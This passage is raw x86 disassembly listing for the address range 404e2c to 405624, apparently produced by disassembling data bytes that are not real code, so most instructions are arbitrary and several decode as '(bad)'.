  404e2c:	or     DWORD PTR [ebx],esp
  404e2e:	dec    esp
  404e2f:	or     BYTE PTR [edx],ah
  404e31:	add    BYTE PTR [eax+0x28],0x84
  404e35:	add    BYTE PTR [ecx+eax*4+0x21d00824],0x95
  404e3d:	inc    eax
  404e3e:	add    BYTE PTR [eax+edx*1],al
  404e41:	dec    eax
  404e42:	jno    0x404e45
  404e44:	and    BYTE PTR [eax],ah
  404e46:	or     al,0x35
  404e48:	adc    cl,al
  404e4a:	sub    BYTE PTR [eax-0x29ef7e00],dl
  404e50:	xor    dh,al
  404e52:	add    BYTE PTR [eax-0x50],al
  404e55:	xchg   ecx,eax
  404e56:	add    ah,BYTE PTR [ecx+0x4]
  404e59:	dec    edx
  404e5a:	sub    DWORD PTR [eax-0x80],eax
  404e5d:	add    BYTE PTR [eax],al
  404e5f:	nop
  404e60:	add    ecx,ebx
  404e62:	test   DWORD PTR [eax+0x7],ebp
  404e65:	xor    cl,ah
  404e67:	adc    al,ah
  404e69:	adc    al,0x40
  404e6b:	sbb    ah,BYTE PTR [eax]
  404e6d:	or     BYTE PTR [eax],al
  404e6f:	test   al,0x42
  404e71:	add    ah,BYTE PTR [ecx+eax*8]
  404e74:	or     BYTE PTR [edx+edx*1],cl
  404e77:	inc    esi
  404e78:	add    DWORD PTR [edx],0x30105104
  404e7e:	inc    esi
  404e7f:	or     BYTE PTR [edx+0xaa8404c],ah
  404e85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e86:	push   edx
  404e87:	push   edx
  404e88:	dec    eax
  404e89:	dec    eax
  404e8a:	sbb    al,BYTE PTR [ecx+0x21]
  404e8d:	or     BYTE PTR [eax+eiz*1],dl
  404e90:	cwde   
  404e91:	push   ss
  404e92:	push   es
  404e93:	dec    esp
  404e94:	add    BYTE PTR [eax],ah
  404e96:	add    al,BYTE PTR [ecx+0x40428400]
  404e9c:	adc    DWORD PTR [eax],ecx
  404e9e:	push   es
  404e9f:	and    ah,BYTE PTR [ecx]
  404ea1:	add    dl,BYTE PTR [eax-0x6dfdb7fd]
  404ea7:	pusha  
  404ea8:	inc    eax
  404ea9:	mov    edx,0x752c15ff
  404eae:	inc    ecx
  404eaf:	add    BYTE PTR [eax+0x26],al
  404eb2:	add    BYTE PTR [eax+0xc],al
  404eb5:	add    al,0x80
  404eb7:	add    BYTE PTR [eax],dl
  404eb9:	adc    DWORD PTR [eax],eax
  404ebb:	or     DWORD PTR [edx+0x2],0x22008480
  404ec2:	push   esi
  404ec3:	add    BYTE PTR [eax],al
  404ec5:	jo     0x404e50
  404ec7:	add    dl,BYTE PTR [eax]
  404ec9:	fst    DWORD PTR [eax]
  404ecb:	add    al,BYTE PTR [edx-0x7fed8000]
  404ed1:	sub    DWORD PTR [ebx],eax
  404ed3:	pushf  
  404ed4:	sbb    BYTE PTR [edx+0x60200080],dh
  404eda:	sbb    DWORD PTR [eax+0x10],edx
  404edd:	sar    BYTE PTR [edx],1
  404edf:	or     ah,BYTE PTR [eax-0x40]
  404ee2:	adc    DWORD PTR [edx],esp
  404ee4:	sbb    DWORD PTR [ecx],0x9067804
  404eea:	add    BYTE PTR [eax+0x25],al
  404eed:	and    BYTE PTR ds:0x182940a,al
  404ef3:	sub    BYTE PTR [eax+eiz*4],0x7e
  404ef7:	add    BYTE PTR [ebx],dl
  404ef9:	push   ss
  404efa:	adc    BYTE PTR [eax+0x4328120],al
  404f00:	add    BYTE PTR [eax-0x74],0x4e
  404f04:	jb     0x404f36
  404f06:	push   edx
  404f07:	inc    esp
  404f08:	cmp    bl,BYTE PTR [eax]
  404f0a:	add    BYTE PTR [ecx+esi*4],0x4
  404f0e:	or     DWORD PTR [edx],eax
  404f10:	push   eax
  404f11:	adc    BYTE PTR [esi+0x1b825830],al
  404f17:	mov    dl,BYTE PTR [eax+0x1]
  404f1a:	inc    eax
  404f1b:	add    ah,dl
  404f1d:	add    BYTE PTR [edx],al
  404f1f:	or     al,0x3
  404f21:	das    
  404f22:	add    BYTE PTR [eax],dl
  404f24:	add    BYTE PTR [edi+0x2],al
  404f27:	and    BYTE PTR ds:0xa281c69e,al
  404f2d:	js     0x404f37
  404f2f:	add    BYTE PTR ds:0x802b0600,ah
  404f35:	lock adc DWORD PTR [ecx],esp
  404f38:	or     BYTE PTR [eax+ecx*1+0x11],al
  404f3c:	sbb    al,BYTE PTR [esi]
  404f3e:	or     BYTE PTR [eax],dl
  404f40:	add    al,0xb
  404f42:	mov    esp,0xc8894460
  404f47:	adc    dh,BYTE PTR [esi+0x4c89000]
  404f4d:	test   DWORD PTR [edx+0x401c0],eax
  404f53:	retf   0x5ac5
  404f56:	test   al,0x56
  404f58:	add    BYTE PTR [edx+0x24],0x21
  404f5c:	les    eax,FWORD PTR [edx]
  404f5e:	arpl   WORD PTR [ecx],dx
  404f60:	add    BYTE PTR [esi],al
  404f62:	add    al,BYTE PTR [ebx-0x28]
  404f65:	adc    DWORD PTR [ecx],eax
  404f67:	mov    BYTE PTR [eax+0x0],cl
  404f6a:	sbb    DWORD PTR [eax],0x43806404
  404f70:	and    BYTE PTR [eax],al
  404f72:	inc    eax
  404f73:	adc    BYTE PTR [edx+eax*2],dh
  404f76:	jb     0x404f81
  404f78:	mov    BYTE PTR [eax+0x10],al
  404f7b:	cmp    BYTE PTR [edx+0x60],ch
  404f7e:	inc    ebx
  404f7f:	adc    al,BYTE PTR [eax]
  404f81:	inc    edx
  404f82:	adc    BYTE PTR [eax+ebx*8-0x3fdf6fe0],al
  404f89:	mov    ?,WORD PTR [eax+0x0]
  404f8c:	sbb    al,BYTE PTR [ebx]
  404f8e:	inc    eax
  404f8f:	es sub al,0x60
  404f92:	pop    edx
  404f93:	sbb    ch,BYTE PTR [ecx]
  404f95:	dec    eax
  404f96:	add    BYTE PTR [ecx],dl
  404f98:	int3   
  404f99:	push   0x25160088
  404f9e:	xchg   BYTE PTR [ecx],dl
  404fa0:	popa   
  404fa1:	jo     0x404fc3
  404fa3:	add    dl,BYTE PTR [eax]
  404fa5:	and    BYTE PTR [eax],al
  404fa7:	add    BYTE PTR [eax],0x6
  404faa:	pusha  
  404fab:	arpl   WORD PTR [ecx+0x58],ax
  404fae:	add    BYTE PTR [eax-0x7bed64c0],al
  404fb4:	adc    DWORD PTR [eax],eax
  404fb6:	add    al,0x4
  404fb8:	dec    eax
  404fb9:	or     BYTE PTR [eax+0x42],cl
  404fbc:	and    BYTE PTR [edx],cl
  404fbe:	add    BYTE PTR [eax],al
  404fc0:	mov    cl,BYTE PTR [eax+0x5002042]
  404fc6:	dec    eax
  404fc7:	push   eax
  404fc8:	add    BYTE PTR [eax],dl
  404fca:	add    BYTE PTR [eax],al
  404fcc:	xor    al,0x55
  404fce:	cmp    dl,BYTE PTR [eax]
  404fd0:	inc    ecx
  404fd1:	push   ss
  404fd2:	inc    eax
  404fd3:	xor    al,0x1
  404fd5:	add    al,0x88
  404fd7:	sbb    BYTE PTR [edx+edx*2],dl
  404fda:	and    dh,BYTE PTR [edx]
  404fdc:	pop    eax
  404fdd:	add    BYTE PTR [edx],ah
  404fdf:	adc    dl,0xa
  404fe2:	and    BYTE PTR [ecx+0x2],al
  404fe5:	sbb    al,0x4
  404fe7:	add    al,BYTE PTR [eax+0x8]
  404fea:	add    BYTE PTR [edx+0x4028140],al
  404ff0:	and    DWORD PTR [eax],eax
  404ff2:	push   ecx
  404ff3:	add    BYTE PTR [ecx],cl
  404ff5:	adc    cl,BYTE PTR [edx+edx*1]
  404ff8:	add    al,0x80
  404ffa:	inc    eax
  404ffb:	inc    eax
  404ffc:	add    BYTE PTR [ecx],al
  404ffe:	sub    eax,DWORD PTR [eax+0x23000201]
  405004:	and    BYTE PTR ds:0x32000211,ch
  40500a:	js     0x40500c
  40500c:	mov    al,ds:0x480988a0
  405011:	add    DWORD PTR [edx+0x10001f08],0x700d2160
  40501b:	inc    edi
  40501c:	test   BYTE PTR [eax+edx*2+0x0],al
  405020:	add    DWORD PTR [eax],eax
  405022:	mov    al,ds:0x41c
  405027:	jo     0x404fea
  405029:	cs xchg ecx,eax
  40502b:	xor    BYTE PTR [eax+0x0],al
  40502e:	inc    eax
  40502f:	ret    0x2206
  405032:	pusha  
  405033:	or     DWORD PTR [ebx],edx
  405035:	inc    esp
  405036:	and    BYTE PTR [eax+0x8],ah
  405039:	cmp    edx,DWORD PTR [edx-0x75fbff5a]
  40503f:	sub    al,0x4a
  405041:	adc    dl,BYTE PTR [ecx+0x74a2491c]
  405047:	and    al,0x30
  405049:	jo     0x405073
  40504b:	adc    BYTE PTR [ecx],0x49
  40504e:	mov    ah,0x3
  405050:	xchg   ecx,eax
  405051:	adc    DWORD PTR [eax+eax*1],0xc0d002a4
  405058:	push   ss
  405059:	add    BYTE PTR [edx-0x67fdf3e0],al
  40505f:	sbb    bl,BYTE PTR [eax]
  405061:	and    eax,0x50504c08
  405066:	and    eax,DWORD PTR [eax+eax*1]
  405069:	sub    BYTE PTR [eax-0x78],cl
  40506c:	or     eax,DWORD PTR [eax]
  40506e:	loop   0x405082
  405070:	adc    al,0xf0
  405072:	test   BYTE PTR [eax],al
  405074:	push   esi
  405075:	js     0x405039
  405077:	jo     0x4050a1
  405079:	inc    ebx
  40507a:	push   es
  40507b:	or     BYTE PTR ds:0x40858565,al
  405081:	adc    BYTE PTR [eax],al
  405083:	sub    BYTE PTR [eax+0x9f2203],bl
  405089:	add    BYTE PTR [edx],al
  40508b:	xor    BYTE PTR [eax],al
  40508d:	dec    eax
  40508e:	inc    eax
  40508f:	cvtpi2ps xmm2,QWORD PTR [eax+0x46]
  405093:	add    BYTE PTR [eax+0x0],0x0
  405097:	push   es
  405098:	inc    eax
  405099:	add    eax,DWORD PTR [ecx+0x2030a85]
  40509f:	add    BYTE PTR [ebp-0x79ce5fc0],al
  4050a5:	and    al,0xc0
  4050a7:	mov    BYTE PTR [ecx+eiz*4+0x10],al
  4050ab:	or     al,0x82
  4050ad:	push   es
  4050ae:	inc    esp
  4050af:	add    ecx,esi
  4050b1:	or     DWORD PTR [eax],eax
  4050b3:	mov    BYTE PTR [edx],ah
  4050b5:	sub    BYTE PTR [edi],cl
  4050b7:	adc    DWORD PTR [eax],ebp
  4050b9:	dec    eax
  4050ba:	add    BYTE PTR [edx],dh
  4050bc:	add    BYTE PTR [esi],cl
  4050be:	push   es
  4050bf:	sbb    BYTE PTR ds:0xa301070a,al
  4050c5:	add    DWORD PTR [esi],eax
  4050c7:	mov    BYTE PTR ds:0xc4008212,cl
  4050cd:	sbb    al,cl
  4050cf:	add    BYTE PTR [ebp+0x44a81109],dl
  4050d5:	add    BYTE PTR [esi-0x80],al
  4050d8:	adc    al,0x0
  4050db:	add    BYTE PTR [ebx],al
  4050dd:	push   edi
  4050de:	xor    ecx,DWORD PTR [eax-0x4ed7f300]
  4050e4:	add    edx,esp
  4050e6:	add    BYTE PTR [ecx],al
  4050e8:	add    DWORD PTR [ecx+edi*2],esp
  4050eb:	or     ebx,DWORD PTR es:[eax]
  4050ee:	push   0x60
  4050f0:	adc    DWORD PTR [eax+0x4ea8042],eax
  4050f6:	and    BYTE PTR [eax+0x9],0x42
  4050fa:	pop    eax
  4050fb:	adc    dl,0x18
  4050fe:	and    BYTE PTR [eax],al
  405100:	add    al,BYTE PTR [eax]
  405102:	enter  0x92c,0x0
  405106:	pusha  
  405107:	rol    BYTE PTR [eax+0x18],0x8
  40510b:	add    BYTE PTR [esi],al
  40510d:	or     BYTE PTR [eax-0x64bbfdfd],al
  405113:	inc    ecx
  405114:	mov    al,ds:0x91000104
  405119:	add    al,0x0
  40511b:	cmp    DWORD PTR [eax+0x4152b680],eax
  405121:	dec    eax
  405122:	inc    ebp
  405123:	or     dl,BYTE PTR [eax+eiz*1]
  405126:	nop
  405127:	and    BYTE PTR [eax],ch
  405129:	nop
  40512a:	or     eax,0x12c5089a
  40512f:	mov    ah,al
  405131:	mov    eax,ds:0x48854202
  405136:	push   eax
  405137:	xchg   ebp,eax
  405138:	adc    edx,DWORD PTR [eax-0x78]
  40513b:	mov    BYTE PTR [eax+0x66],bl
  40513e:	and    DWORD PTR [eax],0x94b80261
  405144:	je     0x4050ce
  405146:	sbb    BYTE PTR [ecx],cl
  405148:	xor    BYTE PTR [ebp-0x76fdfbe0],bl
  40514e:	add    BYTE PTR [eax],ah
  405150:	add    DWORD PTR [eax],ebp
  405152:	add    DWORD PTR [edx],edx
  405154:	push   es
  405155:	dec    edx
  405156:	xor    BYTE PTR [ebx],0xb0
  405159:	add    BYTE PTR [edx],0x18
  40515c:	test   DWORD PTR [eax+0x70],eax
  40515f:	or     BYTE PTR [eax+0x613a006],ah
  405165:	adc    DWORD PTR [edi+0x2343],0xffffff86
  40516c:	add    al,cl
  40516e:	mov    eax,DWORD PTR [eax+0x20000544]
  405174:	add    BYTE PTR [ebx],al
  405176:	sub    esp,DWORD PTR [eax+0x5a0]
  40517c:	and    BYTE PTR [ebx],ch
  40517e:	inc    edx
  40517f:	add    al,0x24
  405181:	bound  ebx,QWORD PTR [ebx+edx*1]
  405184:	pop    esi
  405185:	inc    ecx
  405186:	push   es
  405187:	sub    BYTE PTR [eax],0x25
  40518a:	inc    eax
  40518b:	add    DWORD PTR [ebx],0x0
  40518e:	or     BYTE PTR [ecx+eax*4],al
  405191:	add    BYTE PTR [ebx+0x10530234],0x13
  405198:	and    bl,BYTE PTR [eax+0x68300010]
  40519e:	add    BYTE PTR ds:0x8014402,0x80
  4051a5:	add    BYTE PTR [edi],al
  4051a7:	add    DWORD PTR [ebx],esp
  4051a9:	add    dh,al
  4051ab:	add    cl,BYTE PTR [edx+0x319e08a8]
  4051b1:	sub    al,0x99
  4051b3:	(bad)  
  4051b4:	in     eax,0xc2
  4051b6:	cmp    al,0xa
  4051b8:	and    BYTE PTR [eax],al
  4051ba:	or     al,0x30
  4051bc:	and    BYTE PTR [ebx+0x8500011],al
  4051c2:	dec    esi
  4051c3:	add    al,0x19
  4051c5:	and    DWORD PTR [ecx+0x760a810],esp
  4051cb:	and    BYTE PTR [ecx+0x5040d24a],al
  4051d1:	loope  0x405193
  4051d3:	sbb    DWORD PTR [eax+eiz*1+0x1a204404],0x0
  4051db:	add    al,bh
  4051dd:	add    edi,DWORD PTR [ecx]
  4051df:	add    al,BYTE PTR [eax]
  4051e1:	add    eax,0xe20296
  4051e6:	and    DWORD PTR [esp+edx*1],esp
  4051e9:	inc    eax
  4051ea:	adc    cl,BYTE PTR [eax+0x426042c]
  4051f0:	add    al,BYTE PTR [ebx]
  4051f2:	add    BYTE PTR [eax+0x50],al
  4051f5:	push   eax
  4051f6:	adc    BYTE PTR [eax+0x2086022e],0x8
  4051fd:	nop
  4051fe:	add    edx,ecx
  405200:	adc    BYTE PTR [eax+edx*1+0x39],0x48
  405205:	test   BYTE PTR [ecx],al
  405207:	or     al,0xa0
  405209:	inc    eax
  40520a:	or     eax,0xd9a13507
  40520f:	sub    BYTE PTR [eax],cl
  405211:	add    DWORD PTR [ebx],ecx
  405213:	xor    BYTE PTR [eax*1-0x5df9ae36],bl
  40521a:	xchg   DWORD PTR [ecx],eax
  40521c:	add    BYTE PTR [eax+eiz*4-0x7dbedfde],ah
  405223:	sub    al,0x80
  405225:	add    DWORD PTR [eax],0x8480480
  40522b:	adc    al,BYTE PTR [eax+0x302110a0]
  405231:	sub    BYTE PTR [eax+eax*8+0x0],al
  405235:	push   es
  405236:	xor    DWORD PTR [esi],ecx
  405238:	loopne 0x40521a
  40523a:	ror    DWORD PTR [eax],0xa0
  40523d:	or     BYTE PTR [ecx+0x5],ah
  405240:	add    BYTE PTR [eax],dh
  405242:	and    BYTE PTR [eax],al
  405244:	add    BYTE PTR [eax],al
  405246:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405247:	ret    0x6055
  40524a:	xlat   BYTE PTR ds:[ebx]
  40524b:	add    al,BYTE PTR [eax]
  40524d:	add    eax,DWORD PTR [eax+0x48]
  405250:	test   BYTE PTR [eax],dl
  405252:	dec    esp
  405253:	nop
  405254:	or     cl,BYTE PTR [edi+eiz*2+0x8]
  405258:	sub    BYTE PTR [eax],al
  40525a:	ret    0x18a
  40525d:	mov    BYTE PTR [eax+0x40],al
  405260:	ret    0x2204
  405263:	adc    BYTE PTR [edx-0x7dfbf5fa],0x42
  40526a:	or     dl,BYTE PTR [eax+eax*1]
  40526d:	add    BYTE PTR [edx+0x14],al
  405270:	and    al,0x30
  405272:	inc    edx
  405273:	inc    eax
  405274:	or     DWORD PTR [edx],edi
  405276:	sub    BYTE PTR ds:0x3048408c,ch
  40527c:	inc    esi
  40527d:	sbb    BYTE PTR [eax+edx*2+0x2804283],ch
  405284:	add    ah,BYTE PTR [eax+0xc44644a]
  40528a:	mov    ds:0x80606201,al
  40528f:	out    0x2,al
  405291:	or     BYTE PTR [edx],al
  405293:	inc    ebx
  405294:	mov    ah,0x87
  405296:	adc    BYTE PTR [eax],cl
  405298:	inc    ecx
  405299:	add    BYTE PTR [edx],dl
  40529b:	add    ah,BYTE PTR [edx]
  40529d:	add    bh,BYTE PTR [esi+0x450012b8]
  4052a3:	mov    cl,0x20
  4052a5:	add    DWORD PTR gs:[eax],eax
  4052a8:	add    BYTE PTR ds:0x90800200,0xa2
  4052af:	xchg   edx,eax
  4052b0:	inc    ecx
  4052b1:	xor    BYTE PTR [ebx],cl
  4052b3:	sbb    BYTE PTR [eax+0x10028282],cl
  4052b9:	and    BYTE PTR [eax],al
  4052bb:	add    BYTE PTR [eax],ah
  4052bd:	xor    DWORD PTR [eax],eax
  4052bf:	and    al,0x1c
  4052c1:	add    eax,0x8c260112
  4052c6:	add    DWORD PTR [eax],edx
  4052c8:	and    BYTE PTR ds:0x7020684e,0xa
  4052cf:	add    BYTE PTR [ecx-0x32fcf9f4],al
  4052d5:	dec    edi
  4052d6:	and    BYTE PTR [eax],0x28
  4052d9:	inc    edx
  4052da:	sub    BYTE PTR [eax-0x6efffff0],ah
  4052e0:	or     al,0x91
  4052e2:	and    DWORD PTR [eax],eax
  4052e4:	and    bl,BYTE PTR [eax+eax*1+0x606048]
  4052eb:	add    BYTE PTR [ecx+0x4],al
  4052ee:	inc    ebp
  4052ef:	adc    BYTE PTR [eax],cl
  4052f1:	adc    BYTE PTR [ecx-0x5ff777c0],al
  4052f7:	dec    eax
  4052f8:	or     BYTE PTR [edx+0x20],dl
  4052fb:	xchg   ebp,eax
  4052fc:	add    BYTE PTR [edx-0x3dfcfef0],cl
  405302:	add    BYTE PTR cs:[eax+edx*2+0x22a44a2],0x41
  40530b:	or     BYTE PTR [eax],ah
  40530d:	add    BYTE PTR [esi+0x26001041],al
  405313:	or     DWORD PTR [edx],edx
  405315:	mov    dl,0x54
  405317:	adc    BYTE PTR [ebx],al
  405319:	add    eax,0x8812004
  40531e:	inc    ebx
  40531f:	rol    BYTE PTR [esi-0x687bff00],0x20
  405326:	popa   
  405327:	add    al,0x36
  405329:	(bad)  
  40532a:	retf   0xb20
  40532d:	add    BYTE PTR [ebx],dl
  40532f:	inc    edx
  405330:	adc    al,ah
  405332:	add    al,cl
  405334:	adc    BYTE PTR [eax+ecx*1],al
  405337:	ror    DWORD PTR [eax],0x5a
  40533a:	mov    al,ds:0x2085018
  40533f:	ror    DWORD PTR [eax+0x140c6083],0x44
  405346:	inc    esp
  405347:	mov    ecx,DWORD PTR [edx]
  405349:	add    eax,DWORD PTR [eax]
  40534b:	add    BYTE PTR [edx],0x20
  40534e:	add    BYTE PTR [eax+0x10400809],ah
  405354:	add    BYTE PTR [ebx],al
  405356:	or     BYTE PTR [edx+eax*1+0x26524840],al
  40535d:	add    BYTE PTR [eax+0x84a10],al
  405363:	add    dl,BYTE PTR [ecx]
  405365:	xchg   edx,eax
  405366:	or     BYTE PTR [eax],al
  405368:	sub    BYTE PTR [ecx],ch
  40536a:	add    BYTE PTR [edx],cl
  40536c:	bound  eax,QWORD PTR [eax+0x72]
  40536f:	sub    BYTE PTR [eax-0x1f5dfff8],al
  405375:	adc    BYTE PTR [eax+0x202c8121],ah
  40537b:	adc    al,BYTE PTR [eax+0x20c24138]
  405381:	imul   ecx,DWORD PTR [ecx+0x70],0x8c20c4
  405388:	xor    al,0x9
  40538b:	fs and al,0x88
  40538e:	dec    ecx
  40538f:	add    cl,BYTE PTR [ebp+0x40]
  405392:	sub    DWORD PTR [edi],eax
  405394:	add    eax,0x26c090
  405399:	add    BYTE PTR [edi],0x2a
  40539c:	and    cl,BYTE PTR [edx-0x799d559e]
  4053a2:	and    BYTE PTR [eax],0x30
  4053a5:	or     al,ah
  4053a7:	add    dl,BYTE PTR [eax]
  4053a9:	add    al,0x59
  4053ab:	adc    al,0x45
  4053ad:	or     dl,BYTE PTR [edx+0x34]
  4053b0:	aam    0xe2
  4053b2:	mov    DWORD PTR [eax],eax
  4053b4:	or     BYTE PTR [ecx],cl
  4053b6:	inc    edx
  4053b7:	sub    BYTE PTR [eax],al
  4053b9:	mov    BYTE PTR [bp+si-0x67],dl
  4053bd:	rol    BYTE PTR ds:0x5000011,0x0
  4053c4:	or     BYTE PTR [eax+eiz*2+0x8100f2d],0x32
  4053cc:	or     BYTE PTR [eax+0x42300040],0x80
  4053d3:	sub    BYTE PTR [eax+0x2d],0x42
  4053d7:	adc    BYTE PTR [eax],cl
  4053d9:	or     DWORD PTR [eax+0x52],0x10
  4053dd:	add    esi,DWORD PTR [esi]
  4053df:	pop    eax
  4053e0:	dec    eax
  4053e1:	add    DWORD PTR [eax+eax*4+0x21000810],edi
  4053e8:	inc    eax
  4053e9:	nop
  4053ea:	add    BYTE PTR [ecx],ah
  4053ec:	add    BYTE PTR [ecx],cl
  4053ee:	mov    al,ds:0x24098218
  4053f3:	out    0x60,eax
  4053f5:	cmp    esp,DWORD PTR [eax+0x0]
  4053f8:	mov    eax,ds:0x20542440
  4053fd:	add    BYTE PTR [ecx+0x8],0x28
  405401:	sbb    BYTE PTR [eax+0x30],al
  405404:	or     eax,DWORD PTR [ecx+0x160ca00d]
  40540a:	popa   
  40540b:	inc    ebx
  40540c:	add    BYTE PTR [ecx],ah
  40540e:	adc    DWORD PTR [edi],esp
  405410:	add    cl,BYTE PTR [esi]
  405412:	je     0x40541b
  405414:	dec    edx
  405415:	sub    BYTE PTR [ebp+0x40],dl
  405418:	add    BYTE PTR [ecx+0x46],ah
  40541b:	xor    BYTE PTR [ebx],ch
  40541d:	popa   
  40541e:	pop    eax
  40541f:	inc    edx
  405420:	pusha  
  405421:	retf   0xa1c5
  405424:	add    BYTE PTR [eax+0x1302a034],ah
  40542a:	push   eax
  40542b:	add    DWORD PTR [edi+eax*4],ebx
  40542e:	rol    BYTE PTR [ecx+eiz*1],0x0
  405432:	mov    eax,ds:0x3244c180
  405437:	add    eax,DWORD PTR [eax]
  405439:	or     BYTE PTR [eax+0x15],al
  40543c:	add    BYTE PTR [eax],dh
  40543e:	add    eax,0x628210d0
  405443:	add    eax,0x40022041
  405448:	test   BYTE PTR [edx+0x0],cl
  40544b:	push   eax
  40544c:	inc    eax
  40544d:	add    al,0x6
  40544f:	add    ebx,DWORD PTR ds:0x4662e224
  405455:	pop    eax
  405456:	or     BYTE PTR ds:0x9ec080c1,al
  40545c:	mov    ds:0x294108,eax
  405461:	sbb    BYTE PTR [esi+0x8001028],dl
  405467:	mov    dh,0x84
  405469:	add    al,0xa0
  40546b:	pop    eax
  40546c:	or     al,BYTE PTR [edx*1+0x43884810]
  405473:	dec    edx
  405474:	or     BYTE PTR [eax+0x201042],ah
  40547a:	and    BYTE PTR [eax+0x40820054],al
  405480:	or     DWORD PTR [eax+edx*8],eax
  405483:	mov    eax,ds:0xa4880c18
  405488:	add    BYTE PTR [eax],al
  40548a:	xchg   ecx,eax
  40548b:	add    BYTE PTR [eax+0x2008e040],dl
  405491:	adc    BYTE PTR [eax],al
  405493:	dec    eax
  405494:	add    al,0x24
  405496:	add    eax,0xe4008220
  40549b:	adc    BYTE PTR [eax],0x26
  40549e:	or     BYTE PTR [edx],cl
  4054a0:	retf   0x8010
  4054a3:	add    BYTE PTR [eax+0x22],al
  4054a6:	add    dh,BYTE PTR [eax]
  4054a8:	mov    al,ds:0x98002001
  4054ad:	xchg   cl,al
  4054af:	inc    eax
  4054b0:	mov    DWORD PTR [edx],ecx
  4054b2:	test   BYTE PTR [eax-0x54],dl
  4054b5:	pop    es
  4054b6:	call   0x24:0x33231401
  4054bd:	inc    eax
  4054be:	add    ah,BYTE PTR [ebx]
  4054c0:	jb     0x4054d2
  4054c2:	mov    al,BYTE PTR [eax]
  4054c4:	push   eax
  4054c5:	inc    eax
  4054c6:	and    BYTE PTR [ecx+0x62],dl
  4054c9:	adc    BYTE PTR [eax+0x18],ah
  4054cc:	sbb    al,0x24
  4054ce:	adc    DWORD PTR [ebp+0x60],edx
  4054d1:	enter  0x1022,0x41
  4054d5:	retf   
  4054d6:	push   esp
  4054d7:	add    BYTE PTR [eax-0x38],al
  4054da:	sub    BYTE PTR [eax],bh
  4054dc:	add    eax,0x926a2003
  4054e2:	or     al,0x0
  4054e4:	inc    eax
  4054e5:	js     0x405507
  4054e7:	sub    BYTE PTR [eax+0x10708],ch
  4054ed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054ee:	add    BYTE PTR [eax],al
  4054f0:	inc    eax
  4054f1:	cmp    DWORD PTR [eax],esi
  4054f3:	or     edx,eax
  4054f5:	or     ecx,DWORD PTR fs:[ebx+0x49028]
  4054fc:	adc    BYTE PTR [edi],dl
  4054fe:	add    DWORD PTR [ecx],edx
  405500:	add    ecx,0x0
  405503:	inc    eax
  405504:	adc    BYTE PTR [ebx],al
  405506:	dec    esp
  405507:	push   edi
  405508:	push   ecx
  405509:	and    BYTE PTR [ecx+eiz*1],dl
  40550c:	add    BYTE PTR [eax+0x656bc459],ch
  405512:	ret    
  405513:	mov    eax,ds:0x8a0480
  405518:	inc    ecx
  405519:	mov    WORD PTR [eax],fs
  40551b:	add    ah,BYTE PTR [ecx]
  40551d:	ss add eax,0xc1299
  405523:	or     eax,0x31350f
  405528:	or     BYTE PTR [eax],ah
  40552a:	adc    eax,0x3a0a4
  40552f:	add    BYTE PTR ds:0x104c0102,bl
  405535:	and    al,BYTE PTR [edx+ebp*1+0x43824044]
  40553c:	add    BYTE PTR [ebx],ah
  40553e:	pusha  
  40553f:	and    BYTE PTR [ebx],al
  405541:	rol    al,cl
  405543:	or     cl,BYTE PTR [eax+0x4200071e]
  405549:	ror    BYTE PTR [eax],0x1
  40554c:	cmp    BYTE PTR [edx],bl
  40554e:	and    BYTE PTR [edi+eax*1],dl
  405551:	push   es
  405552:	add    BYTE PTR ds:0x49880880,cl
  405558:	nop
  405559:	push   es
  40555a:	mov    ah,BYTE PTR ds:0x8ae00100
  405560:	rol    DWORD PTR [eax],0x44
  405563:	or     al,BYTE PTR [eax+0x4]
  405566:	xor    DWORD PTR [ecx+0x34],eax
  405569:	sbb    DWORD PTR [esi+0x20],eax
  40556c:	adc    BYTE PTR [esi+0x3],ah
  40556f:	pop    es
  405570:	inc    edx
  405571:	push   esi
  405572:	add    BYTE PTR [eax],al
  405574:	add    DWORD PTR [eax],eax
  405576:	adc    BYTE PTR [ecx+eax*4],0x84
  40557a:	rol    BYTE PTR [eax],0xd
  40557d:	adc    al,0xa5
  40557f:	pusha  
  405580:	call   0xc8d0dba5
  405585:	and    DWORD PTR [eax],eax
  405587:	or     al,0x60
  405589:	add    BYTE PTR [edx+0x8],dl
  40558c:	loopne 0x40551e
  40558e:	add    DWORD PTR [eax],eax
  405590:	add    BYTE PTR ds:0x7200828,dl
  405596:	add    BYTE PTR [edx],al
  405598:	add    DWORD PTR [eax+eax*4],esp
  40559b:	and    BYTE PTR [edx+edx*1],cl
  40559e:	cmp    al,al
  4055a0:	inc    esp
  4055a1:	je     0x4055a3
  4055a3:	rcl    BYTE PTR [eax],0x15
  4055a6:	adc    BYTE PTR [bx+si],0x12
  4055aa:	mov    al,ds:0x12481009
  4055af:	mov    BYTE PTR [eax+0x8c60840],ah
  4055b5:	and    BYTE PTR [eax],bl
  4055b7:	push   ss
  4055b8:	add    eax,0x45222034
  4055bd:	sbb    cl,BYTE PTR [ecx+eax*4+0x28]
  4055c1:	and    BYTE PTR [eax],al
  4055c3:	inc    edx
  4055c4:	or     BYTE PTR [eax],al
  4055c6:	add    BYTE PTR [ecx+eiz*1+0x1],dl
  4055cd:	and    BYTE PTR [eax],ah
  4055cf:	push   0x28a0808
  4055d4:	xor    BYTE PTR [eax],bl
  4055d6:	or     BYTE PTR [eax-0x5beddc00],al
  4055dc:	dec    eax
  4055dd:	or     cl,BYTE PTR [eax-0x1b]
  4055e0:	add    al,0x70
  4055e2:	fwait
  4055e3:	or     BYTE PTR [eax],cl
  4055e5:	add    BYTE PTR [eax],dl
  4055e7:	add    BYTE PTR ds:0x12200b02,dl
  4055ed:	sbb    al,BYTE PTR [eax+eiz*4]
  4055f0:	inc    ecx
  4055f1:	enter  0x2648,0x12
  4055f5:	mov    WORD PTR [eax],ss
  4055f7:	or     eax,0x425c8280
  4055fc:	or     cl,BYTE PTR [edx]
  4055fe:	inc    edx
  4055ff:	add    BYTE PTR [edi-0x537bff7e],cl
  405605:	add    cl,BYTE PTR [eax]
  405607:	mov    al,BYTE PTR [eax]
  405609:	sbb    BYTE PTR [eax],cl
  40560b:	nop
  40560c:	inc    eax
  40560d:	and    BYTE PTR [esi],0x9
  405610:	adc    DWORD PTR [eax+0x591101],edx
  405616:	and    al,BYTE PTR [eax]
  405618:	and    al,BYTE PTR [eax+0x2001340]
  40561e:	adc    BYTE PTR ds:0x3000e81a,cl
  405624:	data16 adc BYTE PTR [eax],cl
